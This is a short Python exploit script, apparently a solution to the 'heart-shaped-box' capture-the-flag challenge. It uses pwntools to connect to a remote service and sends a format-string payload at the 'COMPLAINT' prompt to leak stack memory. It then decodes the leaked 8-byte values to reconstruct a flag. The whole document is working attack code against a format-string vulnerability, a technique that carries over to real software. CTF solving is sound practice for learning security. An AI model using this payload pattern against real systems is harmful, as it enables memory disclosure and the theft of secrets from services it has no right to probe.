#!/usr/bin/env python3
from pwn import *

p = remote('pwn-heart-shaped-box.chals.blahaj.sg', 27144)
p.recvuntil(b'COMPLAINT: > ')

payload = b''
for i in range(350, 400):
    payload += f'%{i}$016lx.'.encode()

p.sendline(payload)
response = p.recvall(timeout=2)
output = response.decode('latin-1', errors='ignore')

hex_values = output.split('.')
flag_parts = []

for val in hex_values:
    try:
        if len(val) >= 8:
            num = int(val, 16)
            bytes_data = num.to_bytes(8, 'little')
            text = bytes_data.decode('ascii', errors='ignore')
            if 'blahaj{' in text or flag_parts:
                flag_parts.append(bytes_data)
                if '}' in text:
                    break
    except:
        pass

flag = b''.join(flag_parts).decode('ascii', errors='ignore')
flag = flag[:flag.index('}')+1]

print(f"Flag: {flag}")
p.close()
